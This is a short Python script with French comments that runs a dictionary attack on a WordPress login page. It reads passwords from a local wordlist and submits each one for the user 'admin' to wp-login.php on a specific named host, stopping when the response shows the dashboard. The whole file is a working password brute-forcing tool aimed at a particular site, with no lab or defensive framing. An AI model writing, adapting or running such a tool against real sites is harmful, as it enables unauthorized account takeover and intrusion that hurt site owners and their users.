import requests
import codecs

# URL du formulaire de connexion WordPress
login_url = 'http://hehe.org2.free.fr/wp-login.php'

# Informations d'identification
username = 'admin'

# Chemin du fichier contenant la liste de mots de passe
password_file = 'liste.txt'

# Création de la session
session = requests.Session()

# Lecture de la liste de mots de passe depuis le fichier
with codecs.open(password_file, 'r', encoding='utf-8') as file:
    passwords = file.readlines()

# Supprimer les espaces et les sauts de ligne supplémentaires
passwords = [password.strip() for password in passwords]

# Essayer chaque mot de passe dans la liste
for password in passwords:
    # Envoi des informations d'identification pour la connexion
    login_payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Se connecter',
        'redirect_to': 'http://hehe.org2.free.fr/wp-login.php',
        'testcookie': '1'
    }

    # Effectuer la requête de connexion
    login_request = session.post(login_url, data=login_payload)

    # Vérifier si la connexion a réussi
    if 'Dashboard' in login_request.text:
        print('Connexion réussie avec le mot de passe :', password)
        break
    else:
        print('Échec de la connexion avec le mot de passe :', password)
        print('Essai du mot de passe suivant.')

# Si aucun mot de passe ne fonctionne, afficher un message d'erreur
else:
    print('Échec de la connexion avec tous les mots de passe.')
